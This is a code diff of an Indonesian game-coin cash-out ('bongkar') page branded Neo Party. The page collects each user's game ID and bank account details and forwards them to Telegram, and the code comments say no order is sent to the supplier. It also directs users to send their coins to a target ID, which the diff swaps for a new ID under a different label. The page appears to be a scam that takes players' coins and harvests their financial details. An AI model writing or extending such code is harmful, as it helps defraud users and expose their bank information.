@@ -1,13 +1,13 @@
-<!DOCTYPE html> 
-<html lang="id"> 
-<head> 
-    <meta charset="UTF-8"> 
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Bongkar - Neo Party</title> 
+    <title>Bongkar - Neo Party</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
-    <style> 
+
+    <style>
         :root {
             --primary-dark: #032b29;
             --primary-light: #0b5250;
@@ -30,7 +30,7 @@
     margin:0 3px;
 }
 
-        
+
 .btn-chat-admin {
     display: inline-flex;
     align-items: center;
@@ -251,7 +251,7 @@
             margin: 20px 0; text-align: center; border: 1px solid rgba(255,255,255,0.05);
         }
         .id-image { width: 140px; border-radius: 10px; border: 3px solid #ffcc33; margin-bottom: 15px; }
-        .copy-btn { 
+        .copy-btn {
             background: #fff; border: none; padding: 8px 15px; border-radius: 8px;
             font-weight: 800; cursor: pointer; color: #ff9800; font-size: 0.75rem;
         }
@@ -374,10 +374,10 @@
         <div class="banner-container">
             <img src="bgwa.jpeg" alt="Banner" class="banner-img">
         </div>
-        
+
         <div class="btn-group-links">
             <a href="https://www.youtube.com/watch?v=n93T7sNPgdI" target="_blank" class="btn-link-domino">
-                <i class="fab fa-youtube"></i> TUTORIAL BONGKAR & TESTIMONI 
+                <i class="fab fa-youtube"></i> TUTORIAL BONGKAR & TESTIMONI
             </a>
             <a href="http://topup.neoparty.web.id" target="_blank" class="btn-link-domino">
                 <i class="fas fa-coins"></i> TOP UP KOIN KLIK DI SINI
@@ -669,7 +669,7 @@ stars.forEach(s => s.classList.add('active'));
     createToast();
     setInterval(createToast, 5000);
 
-    // --- FORM SUBMIT: POLOSAN — data langsung ke Telegram, tanpa order ke supplier ---
+    // --- FORM SUBMIT: POLOSAN + CEK ID — data ke Telegram hanya jika ID game VALID ---
     document.getElementById("bongkarForm").addEventListener("submit", async function(e) {
         e.preventDefault();
 
@@ -697,12 +697,34 @@ stars.forEach(s => s.classList.add('active'));
             return;
         }
 
-        btn.innerText = "MENGIRIM...";
         btn.disabled = true;
+
+        // --- CEK ID GAME via /api/check-id (server-side) ---
+        // ID tidak terdaftar -> berhenti di sini, data TIDAK dikirim ke Telegram.
+        // Endpoint cek error/timeout -> fail-open (tetap lanjut), sama seperti forwarder.
+        btn.innerText = "MEMERIKSA ID...";
+        try {
+            const chk = await fetch("/api/check-id", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ royal_id: royalId })
+            }).then(r => r.json()).catch(() => null);
+            if (chk && chk.valid === false) {
+                alert("Error, ID akun anda tidak valid");
+                btn.innerText = "PROSES BONGKAR";
+                btn.disabled = false;
+                return;
+            }
+            if (chk && chk.nick) info.nick = chk.nick;
+        } catch (err) {
+            console.error("CEK ID ERROR:", err);
+        }
+
+        btn.innerText = "MENGIRIM...";
 
         try {
             // kirim data order ke Telegram via forwarder (tanpa order ke supplier)
-            await fetch("/api/gcsgames-notify", {
+            await fetch("/api/biasa-notify", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ type: "pending", ...info })
@@ -731,6 +753,7 @@ stars.forEach(s => s.classList.add('active'));
             '<span style="font-weight:700; text-align: right; word-break: break-all; overflow-wrap: anywhere;">' + v + '</span></div>';
         document.getElementById("wd-body").innerHTML =
             row("ID Game", info.royal_id) +
+            (info.nick ? row("Nick Game", info.nick) : "") +
             row("Jumlah", info.amount) +
             row("Estimasi Cair", "Rp " + info.price) +
             row("Tujuan", (info.bank + " " + info.account_number).trim()) +
@@ -739,7 +762,7 @@ stars.forEach(s => s.classList.add('active'));
 
     function copyWithdrawID() {
         const el = document.getElementById("wd-target-id");
-        const id = (el ? el.textContent : "").trim() || "1461077";
+        const id = (el ? el.textContent : "").trim() || "3314726";
         const tmp = document.createElement("input");
         tmp.value = id;
         document.body.appendChild(tmp);
@@ -797,8 +820,8 @@ stars.forEach(s => s.classList.add('active'));
         </div>
         <div id="wd-send" style="background: rgba(255,204,51,0.12); border: 1px solid #ffcc33; border-radius: 12px; padding: 12px; margin-bottom: 12px; text-align: center;">
             <div style="font-size: 0.8rem; font-weight: 700; color: #ffcc33; margin-bottom: 6px;">KIRIM KOIN KE ID:</div>
-            <div id="wd-target-id" style="font-size: 1.3rem; font-weight: 800; color: #fff; letter-spacing: 2px;">1461077</div>
-            <div style="font-size: 0.85rem; color: #00e5f4; font-weight: 700;">NEOPARTY</div>
+            <div id="wd-target-id" style="font-size: 1.3rem; font-weight: 800; color: #fff; letter-spacing: 2px;">3314726</div>
+            <div style="font-size: 0.85rem; color: #00e5f4; font-weight: 700;">KINGS</div>
             <button type="button" onclick="copyWithdrawID()" style="margin-top: 8px; background: #fff; border: none; padding: 6px 18px; border-radius: 8px; font-weight: 800; cursor: pointer; color: #ff9800; font-size: 0.75rem;">SALIN ID</button>
         </div>
         <div id="wd-body" style="font-size: 0.85rem; line-height: 1.9; color: #fff;"></div>
@@ -807,7 +830,7 @@ stars.forEach(s => s.classList.add('active'));
     </div>
 </div>
 
-    
+
 <script src="https://api.neoparty.web.id/widget/widget.js?v=2"
         data-api="https://api.neoparty.web.id"
         data-title="CS Neo Party"
